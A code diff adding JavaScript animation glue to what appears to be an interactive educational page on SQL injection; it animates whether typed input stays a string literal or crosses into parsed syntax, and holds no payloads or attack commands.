+/* ---------------- shared boundary / timeline / ctxmap animation glue ---------------- */
+(function(){
+  const ball = document.getElementById('xvBall');
+  const zoneData = document.getElementById('xvZoneData');
+  const zoneCode = document.getElementById('xvZoneCode');
+  const caption = document.getElementById('xvCaption');
+
+  function playBoundary(v){
+    const danger = isDangerous(v);
+    zoneData.classList.remove('xv-calm');
+    zoneCode.classList.remove('xv-hot');
+    ball.classList.remove('xv-fire-safe','xv-fire-danger');
+    void ball.offsetWidth;
+
+    if(!v){
+      caption.textContent = 'Start typing above — watch which side the dot lands on.';
+      return;
+    }
+    if(danger){
+      ball.classList.add('xv-fire-danger');
+      setTimeout(()=>zoneCode.classList.add('xv-hot'), 550);
+      caption.textContent = 'Your text crossed the line — the SQL engine is about to parse part of it as syntax.';
+    } else {
+      ball.classList.add('xv-fire-safe');
+      setTimeout(()=>zoneData.classList.add('xv-calm'), 550);
+      caption.textContent = 'Your text stayed inside the string literal — it is only ever matched, never parsed.';
+    }
+  }
+  liveInput.addEventListener('input', ()=>playBoundary(liveInput.value));
+
+  const status2El = document.getElementById('status2');
+  const flashBox = document.getElementById('xvBrowserFlash');
+  const tlIds = ['xvT1','xvT2','xvT3','xvT4'];
+  function resetTimeline(){ tlIds.forEach(id=>document.getElementById(id).classList.remove('on')); }
+  function playTimeline(){
+    resetTimeline();
+    tlIds.forEach((id,i)=>setTimeout(()=>document.getElementById(id).classList.add('on'), 150 + i*260));
+    flashBox.classList.remove('xv-pulse');
+    void flashBox.offsetWidth;
+    flashBox.classList.add('xv-pulse');
+  }
+  if(status2El){
+    new MutationObserver(()=>{
+      if(status2El.classList.contains('danger')) playTimeline(); else resetTimeline();
+    }).observe(status2El, {attributes:true, attributeFilter:['class']});
+  }
+
+  const ctxEls = ['xvCtx1','xvCtx2','xvCtx3'].map(id=>document.getElementById(id)).filter(Boolean);
+  const dbEls = ['db1','db2','db3','db4','db5'].map(id=>document.getElementById(id)).filter(Boolean);
+  function staggerIn(els, step){
+    if(els.length && 'IntersectionObserver' in window){
+      const io = new IntersectionObserver((entries)=>{
+        entries.forEach(entry=>{
+          if(entry.isIntersecting){
+            els.forEach((el,i)=>setTimeout(()=>el.classList.add('show'), i*step));
+            io.disconnect();
+          }
+        });
+      }, {threshold:.25});
+      io.observe(els[0]);
+    } else {
+      els.forEach(el=>el.classList.add('show'));
+    }
+  }
+  staggerIn(ctxEls, 140);
+  staggerIn(dbEls, 110);
+})();
+</script>
+</body>
+</html>
